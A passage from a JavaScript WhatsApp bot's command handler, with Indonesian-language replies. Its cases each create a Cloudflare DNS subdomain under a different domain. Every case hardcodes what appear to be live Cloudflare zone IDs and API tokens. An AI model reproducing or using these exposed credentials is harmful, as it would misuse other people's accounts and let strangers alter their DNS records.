                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break                  
case  'd28': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "98264c6c53c5bc9080230b077422d748";
               let apitoken = "1W9IHC9mLAKj8hQaMjczy0gA3Of7kPjJ3gAvTlnZ"
               let tld = "adminpanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd29': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9b28f4ad0f06b36dd94cc56b01efc19a";
               let apitoken = "bMiZlOhkSzozUq1jMLO5bk4OeZr0GllyVtVWX1F4"
               let tld = "plerkuda.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd30': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2bb49b2de0cbf75c0462ed90d7d333e1";
               let apitoken = "lZ0XMXdnwp2L1DsI3f8frkPwvkQ6ENee2PnAfOsY"
               let tld = "cafegt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd31': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "984d44a115c1748d9a34823c3881e491";
               let apitoken = "UYoy7wtrrYwMGtCKdICCJCzvzcSmTXkwPkMmVPmq"
               let tld = "dmdpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break     
case  'd32': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9ddbf1836c0a5a70de3d915d3b81e335";
               let apitoken = "qz5IvvImeSmnYgf6AI9C4PTJ9qpFmBtaAudHhZ2"
               let tld = "storemurah.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break  
case  'd33': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d28c394ba64bf4ecfec1917829d8bced";
               let apitoken = "86ZA4NPGG6ijzlhuRKqc3X3qbH8mgvlzOPsrBApB"
               let tld = "shopwebsite.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case  'd34': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "347f37a08f49a25bb16f82b43ece372a";
               let apitoken = "FCiMlkNShemGyG_8mv3xI_cXSjOs15bVJqgG2zxm"
               let tld = "market-software.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break     
case  'd35': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cda16bf7cb613a196f54b7c0441d3960";
               let apitoken = "jeijhUa-rD-B6I62yEaDDIG23HZpibBOkw3l1bRS"
               let tld = "panel-digital.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break                      
case  'd36': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d6afa7851ec519b570b38f0d1185eb1d";
               let apitoken = "1rH2Mn0rH8GWIQ5UdsA64qmWghTGctgfr1bG_a42"
               let tld = "acrp.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case  'd37': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4b86dfa4879022e26a99d381ace06878";
               let apitoken = "EEkfE5iWyG-pXu6zvQ8TCQk7G-WHV5c-TzdTHlzz"
               let tld = "caca-store.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case 'd78': {
if (!isPremium && !isOwner) return ('Khusus Premium')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3b464a9d67be6bea2b877fff0cee8577";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "vinzzxofficial.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'd77': { 
    if (!isPremium) return m.reply("Fitur Khusus Premium")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9d41b086735604b2c87aa3fcc1fb9068";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "vinnzofficial.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case  'd38': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4694151772044ecbde79bf10b8dca730";
               let apitoken = "eW13F3O29vjOVypirIaGBmU-LwAsZMPAtR8-0x8-"
               let tld = "rhizhosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break 
case  'd39': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "116e3ba4e2ce41388c85195453d272ff";
               let apitoken = "VaiGZW4VPPkfwZPqD2Ztp3FMZPT9vBjFmRu_EDyN"
               let tld = "spasanddella.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
